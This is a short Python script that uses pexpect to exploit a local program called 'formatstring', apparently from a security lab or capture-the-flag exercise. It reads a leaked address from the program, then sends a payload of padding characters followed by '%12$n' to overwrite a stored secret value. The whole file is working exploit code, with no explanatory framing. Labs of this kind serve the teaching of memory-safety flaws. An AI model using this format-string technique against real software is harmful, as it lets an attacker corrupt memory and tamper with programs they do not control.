import pexpect, os, subprocess, argparse

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--secret_1",type=int, help="Input a value to change what is stored in secret[1]", default=0)
    args = parser.parse_args()
    return args

def break_program(size_of_change = 0):
    p = pexpect.spawn("./formatstring")
    print p.readline()
    print p.readline()
    print p.readline()
    address_line = p.readline()
    print address_line
    split_string =  address_line.split()
    decimal_value = int(split_string[4],16)
    print p.readline()
    p.sendline(str(decimal_value))
    print p.readline()
    print p.readline()
    p.sendline("".join(['1']*size_of_change)+"%12$n")
    print p.readline()
    print p.readline()
    print p.readline()
    print p.readline()



def main():
    args = get_args()
    break_program(args.secret_1)

if __name__ == "__main__":
    main()
